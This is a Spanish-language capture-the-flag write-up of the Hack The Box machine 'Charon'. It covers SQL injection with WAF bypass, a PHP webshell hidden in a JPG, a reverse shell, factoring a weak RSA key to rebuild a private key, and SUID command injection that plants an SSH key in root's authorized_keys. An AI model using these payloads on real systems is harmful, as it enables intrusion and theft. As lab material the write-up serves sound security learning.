---
layout: post
title: Charon
date: 2023-02-10
description:
img:
fig-caption:
tags: [OSCP, eWPT]
---
___

<center><img src="/writeups/assets/img/Charon-htb/Charon.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL

* WAF Bypassing

* Arbitrary File Upload

* Reto criptográfico - Creación de id_rsa

* Uso de Ghidra

* LFI (Escalada) [EXTRA]

* Abuso de binario SUID (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.31 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 15:08 GMT
Nmap scan report for 10.10.10.31
Host is up (0.24s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.10.31 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 15:09 GMT
Nmap scan report for 10.10.10.31
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09c7fba24b531a7af3305eb86eec83ee (RSA)
|   256 97e0ba9617d4a1bb3224f4e515b48aec (ECDSA)
|_  256 e89e0b1ce72db6c968467cb332eae9ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Frozen Yogurt Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.20 seconds
```

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.31
http://10.10.10.31 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.31], PoweredBy[:], Script[text/javascript], Title[Frozen Yogurt Shop]
```

La página principal se ve así

<img src="/writeups/assets/img/Charon-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.31/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.31/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/10 15:31:04 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.31/images/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.31/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.31/js/]
/include              (Status: 301) [Size: 312] [--> http://10.10.10.31/include/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.31/fonts/]
/.php                 (Status: 403) [Size: 290]
/cmsdata              (Status: 301) [Size: 312] [--> http://10.10.10.31/cmsdata/]
```

Busco por archivos PHP dentro de ```/cmsdata```

```null
gobuster dir -u http://10.10.10.31/cmsdata -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.31/cmsdata
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/10 15:32:42 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://10.10.10.31/cmsdata/images/]
/login.php            (Status: 200) [Size: 6426]
/scripts              (Status: 301) [Size: 320] [--> http://10.10.10.31/cmsdata/scripts/]
/menu.php             (Status: 302) [Size: 0] [--> login.php?err=2]
/upload.php           (Status: 302) [Size: 0] [--> login.php?err=2]
/css                  (Status: 301) [Size: 316] [--> http://10.10.10.31/cmsdata/css/]
/js                   (Status: 301) [Size: 315] [--> http://10.10.10.31/cmsdata/js/]
/include              (Status: 301) [Size: 320] [--> http://10.10.10.31/cmsdata/include/]
/forgot.php           (Status: 200) [Size: 6322]
```

Hay un panel de inicio de sesión

<img src="/writeups/assets/img/Charon-htb/2.png" alt="">

Tiene una sección para restablecer la contraseña

<img src="/writeups/assets/img/Charon-htb/3.png" alt="">

Paso por BurpSuite la petición, y le introduzco una comilla. Parece que es vulnerable a SQLi

<img src="/writeups/assets/img/Charon-htb/4.png" alt="">

Enumero las columnas. En total hay cuatro. El error es diferente cuando introduzco este valor

<img src="/writeups/assets/img/Charon-htb/5.png" alt="">

Intento aplicar un ordenamiento, pero me devuelve un error y no puedo ver los campos

<img src="/writeups/assets/img/Charon-htb/6.png" alt="">

Al hacer un ```' or 1=1 limit 0,1-- -``` se filtra información

<img src="/writeups/assets/img/Charon-htb/7.png" alt="">

Voy iterando por cada posición desde el intruder de BurpSuite y encuentro dos usuarios válidos

<img src="/writeups/assets/img/Charon-htb/8.png" alt="">

De alguna forma tengo que bypassear el WAF. En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#waf-bypass) explican formas de hacerlo. Al cambiar varios caracteres de minúscula a mayúscula, devuelve otro error, debido a que interpreta que no le estoy pasando un correo

<img src="/writeups/assets/img/Charon-htb/9.png" alt="">

Introduzco en todos los campos correos. Ahora puedo ver reflejado en la respuesta mi input, por lo que quiero pensar que al menos un campo es inyectable, y puedo dumpear datos

<img src="/writeups/assets/img/Charon-htb/10.png" alt="">

Ocurre para el segundo

<img src="/writeups/assets/img/Charon-htb/11.png" alt="">

Puedo ver el nombre de la base de datos

<img src="/writeups/assets/img/Charon-htb/12.png" alt="">

Pero el resto de la forma convencional no, porque no pasa la validación del correo

<img src="/writeups/assets/img/Charon-htb/13.png" alt="">

Si lo anido en una nested query con un group_concat, la cosa cambia

<img src="/writeups/assets/img/Charon-htb/14.png" alt="">

Extraigo las tablas

<img src="/writeups/assets/img/Charon-htb/15.png" alt="">

Y las columnas para ```operators```

<img src="/writeups/assets/img/Charon-htb/16.png" alt="">

Me quedo con los usuarios y contraseñas, pero no están todas. Seguramente no se puedan mostrar de golpe, por lo que es mejor eliminar con expresiones regulares todos aquellos que empiezan por 't'

<img src="/writeups/assets/img/Charon-htb/17.png" alt="">

Se puede hacer desde la propia inyección

<img src="/writeups/assets/img/Charon-htb/18.png" alt="">

Crackstation encuentra la contraseña de los dos hashes

<img src="/writeups/assets/img/Charon-htb/19.png" alt="">

Me puedo loggear en el CMS

<img src="/writeups/assets/img/Charon-htb/20.png" alt="">

Estoy como Administrador

<img src="/writeups/assets/img/Charon-htb/21.png" alt="">

Puedo subir una imagen

image.png

Trato de subir una webshell

```null
<?php
  shell_exec($_REQUEST['cmd']);
?>
```

Pro me salta una alerta diciendo que la extensión no es válida

<img src="/writeups/assets/img/Charon-htb/23.png" alt="">

Al cambiársela, si que puedo intentar subirlo, pero sigue detectando que no es una imagen

<img src="/writeups/assets/img/Charon-htb/24.png" alt="">

En la respuesta hay una cadena en base64 oculta

```null
echo dGVzdGZpbGUx | base64 -d; echo
testfile1
```

<img src="/writeups/assets/img/Charon-htb/25.png" alt="">

Intercepto la respuesta con BurpSuite y le quito los comentarios, para que carge en el Firefox

<img src="/writeups/assets/img/Charon-htb/26.png" alt="">

Me aparece un nuevo campo donde puedo escribir

<img src="/writeups/assets/img/Charon-htb/27.png" alt="">

Se encarga de indicar el nombre con el que se quiere almacenar el archivo (Lo probé con una imagen JPG)

<img src="/writeups/assets/img/Charon-htb/28.png" alt="">

Agrego una regla en BurpSuite para que automáticamente active el campo

<img src="/writeups/assets/img/Charon-htb/29.png" alt="">

A la imagen JPG que descargué de Google, le añado al final un oneliner de PHP que se encargue de ejecutar comandos a través del parámetro CMD. La web me lo va a interpretar, ya que pasa todas las validaciones

<img src="/writeups/assets/img/Charon-htb/30.png" alt="">

Me envío una traza ICMP y la recibo

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:06:20.866807 IP 10.10.10.31 > 10.10.16.5: ICMP echo request, id 1991, seq 1, length 64
18:06:20.866869 IP 10.10.16.5 > 10.10.10.31: ICMP echo reply, id 1991, seq 1, length 64
```

Como tengo conectividad con mi equipo, pruebo a enviarme una reverse shell

<img src="/writeups/assets/img/Charon-htb/31.png" alt="">

Y obtengo una reverse shell

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.31] 50234
bash: cannot set terminal process group (1330): Inappropriate ioctl for device
bash: no job control in this shell
www-data@charon:/var/www/html/freeeze/images$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@charon:/var/www/html/freeeze/images$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@charon:/var/www/html/freeeze/images$ export TERM=xterm
www-data@charon:/var/www/html/freeeze/images$ export SHELL=bash
www-data@charon:/var/www/html/freeeze/images$ stty rows 55 columns 209
www-data@charon:/var/www/html/freeeze/images$ hostname -I
10.10.10.31 dead:beef::250:56ff:feb9:6953 
```

Encuentro credenciales de acceso a la base de datos

```null
www-data@charon:/var/www/html/freeeze/include$ cat __config.php  
<?php
$dbuser="freeeze";
$dbpass="fr2424z";
$dbhost="localhost";
$dbname="freeeze";
?>
```

La enumero, pero no encuentro nada que me sirva

Puedo acceder al directorio personal del usuario decoder

```null
www-data@charon:/home/decoder$ ls -la
total 36
drwxr-xr-x 3 decoder freeeze 4096 Aug 16 16:46 .
drwxr-xr-x 3 root    root    4096 Aug 16 16:46 ..
lrwxrwxrwx 1 root    root       9 Aug 16 15:49 .bash_history -> /dev/null
-rw-r--r-- 1 decoder freeeze  220 Sep  1  2015 .bash_logout
-rw-r--r-- 1 decoder freeeze 3764 Jun 25  2017 .bashrc
drwx------ 2 decoder freeeze 4096 Aug 16 16:46 .cache
-rw-r--r-- 1 decoder freeeze  654 Jun 25  2017 .profile
-rw-r--r-- 1 decoder freeeze  138 Jun 23  2017 decoder.pub
-rw-r--r-- 1 decoder freeeze   32 Jun 23  2017 pass.crypt
-r-------- 1 decoder freeeze   33 Feb 10 15:53 user.txt
```

Puedo leer varios archivos. Uno de ellos parece una clave pública RSA (Muy pequeña, se puede tratar de romper)

```null
www-data@charon:/home/decoder$ cat decoder.pub 
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
mI9wJizmFJhrAgMBAAE=
-----END PUBLIC KEY-----
```

También hay una contraseña encriptada

```null
www-data@charon:/home/decoder$ cat pass.crypt | xxd
00000000: 9932 4fad 5362 89a1 e2d1 8dd0 2265 cd7f  .2O.Sb......"e..
00000010: 1557 9d67 9c89 dd19 54c8 c56f 378d 1149  .W.g....T..o7..I
```

Con la librería Crypto de python, se pueden obtener los valores "q", "p", "n" y "d", necesarios para obtener la id_rsa

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> f = open("id_rsa.pub", "r")
>>> key = RSA.importKey(f.read())
>>> key.n
85161183100445121230463008656121855194098040675901982832345153586114585729131
```

Utilizo [factordb](http://factordb.com/) para factorizar "n" y obtener "p" y "q"

<img src="/writeups/assets/img/Charon-htb/32.png" alt="">

Creo un script en python que se encargue de realizar toda la operatoria

```null
from Crypto.PublicKey import RSA

f = open("id_rsa.pub", "r")

key = RSA.importKey(f.read())

n = key.n
e = key.e

p = 280651103481631199181053614640888768819
q = 303441468941236417171803802700358403049

d = pow(key.e, -1, (p-1)*(q-1))

id_rsa = RSA.construct((n, e, d, p, q))

print(id_rsa.exportKey().decode())
```

Y obtengo la id_rsa

```null
python3 rsa_generator.py
-----BEGIN RSA PRIVATE KEY-----
MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ==
-----END RSA PRIVATE KEY-----
```

Con openssl puedo obtener la contraseña en texto claro

```null
openssl pkeyutl -decrypt -inkey id_rsa < pass.crypt; echo
nevermindthebollocks
```

Me puedo convertir en decoder y ver la primera flag

```null
www-data@charon:/home/decoder$ su decoder
Password: 
decoder@charon:~$ 
decoder@charon:~$ cat user.txt 
fdd46eeb0ed6217d05327bf64110af67
```

# Escalada

Hay un binario SUID que no es UNIX

```null
decoder@charon:/$ find \-perm -4000 2>/dev/null | head -n 1
./usr/local/bin/supershell
```

Lo transfiero a mi equipo, y con Ghidra veo en que consiste la función main

<img src="/writeups/assets/img/Charon-htb/33.png" alt="">

Se está llamando a otra función que se encarga de comparar la cadena que se le pasa como primer parámetro. En caso de que este vacía, contenga alguno de esos caracteres especiales o el tamaño sea igual el valor de la cadena pasado a entero, el programa no avanza. Si todo va bien, se hará una llamada al ```/bin/ls```

<img src="/writeups/assets/img/Charon-htb/34.png" alt="">

Si mi input de usuario es ```/bin/ls```, entonces se ejecutará el comando. En caso contrario, se llama a la función ```__stack_chk_fail()```, que a su vez hace referencia a ```halt_baddata()```

<img src="/writeups/assets/img/Charon-htb/35.png" alt="">

Esto se encarga de ir sumando valores a un buffer. Nada relevante. Como solo se está valorando lo que se le pasa como primer argumento, podría intentar en el segundo ejecutar un comando a nivel de sistema. Pero solo se le puede pasar uno. En caso de que se produzca un error, si interpreta como argumento ese comando puedo incluir archivos locales

```null
decoder@charon:/$ supershell /bin/ls $(whoami)
Supershell (very beta)
usage: supershell <cmd>
```

Para bypassearlo, puedo encapsularlo todo entre comillas simples

```null
decoder@charon:/$ supershell '/bin/ls $(cat /root/root.txt)'
Supershell (very beta)
++[/bin/ls $(cat /root/root.txt)]
/bin/ls: cannot access 'fb23613b3e8a8435392b44501b962b93': No such file or directory
```

Para obtener una shell, metí mi clave pública en las authorized_keys

```null
decoder@charon:/tmp$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCji8ibO+QRRqf4hWb7EJLmqidhSvKIjV1U+qi910slj9DBWUktU2Z6dX+QBJHm1kiHbUFsxx4r3PQEUqS3BvWEOjZlORb2ee0RDbfNvJpxhsispuDAMaZpalyF/0I+gyYtvKLqUBmn8FSx4A
xcE/hsiLDAD9s/xjbMAljzJB+D1UUPHeFy7QVETaG3+kQooId6OkWGzpb1KzZbFYVNspcMLfJPSsqOc3Mgvzvnbo7YJ2Lgrx1Wkct5qMWWq6A8Mc0hSu3jp6ZRqgQdua/jwzdUOGlYSA85goIyGnDD1a7x0g4+fZ3hqNDyPzO+DliSrdmHnPR1btN9Dsq3OC72+TxUSbu46YnKVC8
hEhcTjSQ5r7AdcQ3tTZD7MR1V7wVlD4yuWBPVHBn7yDshXdqaMAvZtdjH/+0jWiBvoB3p0tEEAbkWILKjkR0DHeuAQwFytpLyxR4jZFaIE8FoZHV/5NHJevmgRRsGi0m3AGwIXUDY1fDoi35gLhaa17hjAbU+LEc= root@kali' > authorized_keys
decoder@charon:/tmp$ supershell '/bin/ls $(cp authorized_keys /root/.ssh/)'
Supershell (very beta)
++[/bin/ls $(cp authorized_keys /root/.ssh/)]
authorized_keys  systemd-private-7a40c9a95480495ebc11580131c969f2-systemd-timesyncd.service-Xy6Q0r  vmware-root
```

Y gano acceso por SSH

```null
ssh root@10.10.10.31
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
23 updates are security updates.


Last login: Tue Aug 16 15:45:23 2022
root@charon:~# 
```